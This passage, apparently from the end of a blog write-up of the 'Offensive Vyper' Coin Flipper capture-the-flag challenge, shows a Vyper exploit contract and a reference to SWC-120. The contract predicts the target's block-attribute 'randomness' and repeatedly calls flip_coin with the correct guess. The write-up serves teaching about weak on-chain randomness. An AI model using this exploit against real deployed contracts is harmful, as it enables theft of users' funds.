+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># YOUR EXPLOIT HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@internal</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">guess</span>(<span style="color:#000">nonce</span>: <span style="color:#000">uint256</span>) -&gt; <span style="color:#000">bool</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#000">digest</span>: <span style="color:#000">bytes32</span> = <span style="color:#000">keccak256</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#000">concat</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">block</span>.<span style="color:#000">prevhash</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">block</span>.<span style="color:#000">timestamp</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">block</span>.<span style="color:#000">difficulty</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">nonce</span>, <span style="color:#000">bytes32</span>)
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#000">convert</span>(<span style="color:#000">digest</span>, <span style="color:#000">uint256</span>) % <span style="color:#3af">2</span> == <span style="color:#3af">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">run</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">msg</span>.<span style="color:#000">value</span> == <span style="color:#3af">10</span> ** <span style="color:#3af">18</span>, <span style="color:#5a2">&#34;Not enough ETH&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">for</span> <span style="color:#000">nonce</span> <span style="color:#00f">in</span> <span style="color:#000">range</span>(<span style="color:#3af">10</span>):       
+</span></span><span style="display:flex;"><span>        <span style="color:#000">raw_call</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">self</span>.<span style="color:#000">target</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_abi_encode</span>(<span style="color:#000">self</span>.<span style="color:#000">guess</span>(<span style="color:#000">nonce</span>), <span style="color:#000">method_id</span>=<span style="color:#000">method_id</span>(<span style="color:#5a2">&#34;flip_coin(bool)&#34;</span>)),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">value</span>=<span style="color:#000">msg</span>.<span style="color:#000">value</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__default__</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">pass</span></span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>You can find the complete code <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/coin-flipper.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/CoinFlipperExploit.vy" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://swcregistry.io/docs/SWC-120" target="_blank" rel="noopener noreffer ">SWC-120 - Weak Sources of Randomness from Chain Attributes</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 26, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/" data-title="Offensive Vyper - Challenge 2 - Coin Flipper" data-via="_d3lla_" data-hashtags="Offensive Vyper,CTF,Vyper,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/" data-hashtag="Offensive Vyper"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/offensive-vyper/">Offensive Vyper</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/vyper/">Vyper</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/offensivevyper_01_unstoppableauction/" class="prev" rel="prev" title="Offensive Vyper - Challenge 1 - Unstoppable Auction"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Offensive Vyper - Challenge 1 - Unstoppable Auction</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
